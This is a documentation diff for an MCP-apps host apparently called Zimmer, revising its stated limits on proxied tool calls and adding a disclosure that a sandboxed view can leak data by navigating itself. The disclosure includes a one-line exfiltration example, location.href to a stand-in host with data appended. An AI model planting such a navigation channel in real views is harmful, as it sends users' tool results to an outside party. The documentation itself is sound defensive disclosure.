@@ -2647,12 +2647,21 @@ opaque-origin however it is loaded and never holds `allow-same-origin` at all. T
 tighter, but the reserved `ui/notifications/sandbox-proxy-ready` and `sandbox-resource-ready`
 messages are not implemented, and a view that insists on the proxy handshake will not render.
 
-**A view's proxied `tools/call` is not rate-limited and is not shown to you as it happens.** The
-proxy forwards only tools the server marked `visibility: ["app"]`, and only to the one server the
-fragment came from — but within that, a view may call as often as it likes and the only trace is the
-MCP server's own logs. The spec allows a host to require user consent per call; Zimmer does not, on
-the grounds that the per-server allowlist is where the consent was given. That is a real trade, and
-it is the reason the allowlist is the feature's load-bearing control rather than a convenience.
+**A view's proxied `tools/call` needs no per-call consent and leaves no trace you can read.** The
+proxy forwards only tools the server marked `visibility: ["app"]`, only to the one server the
+fragment came from, and only up to `McpApps::RequestThrottle`'s ceiling — but within that, a view may
+call whatever it likes, whenever it likes, and the only record is the MCP server's own logs. The spec
+allows a host to require user consent per call; Zimmer does not, on the grounds that the per-server
+allowlist is where the consent was given. That is a real trade, and it is the reason the allowlist is
+the feature's load-bearing control rather than a convenience.
+
+**A view can still exfiltrate what it was given, by navigating itself.** The CSP closes `connect-src`
+by default, so a view that declares no `connectDomains` cannot `fetch` anywhere — but no CSP
+directive stops a sandboxed frame navigating *itself*, and `location.href = "https://elsewhere/?" + data`
+is a working channel for whatever the host handed it, chiefly the tool result. It is loud (the panel
+visibly becomes somebody else's page), it cannot reach anything Zimmer holds, and it is contained by
+the fact that an operator named the server — but "no network of any kind" is not literally true, and
+`navigate-to` was removed from the CSP spec, so there is nothing to turn on that would make it so.
 
 ---
 
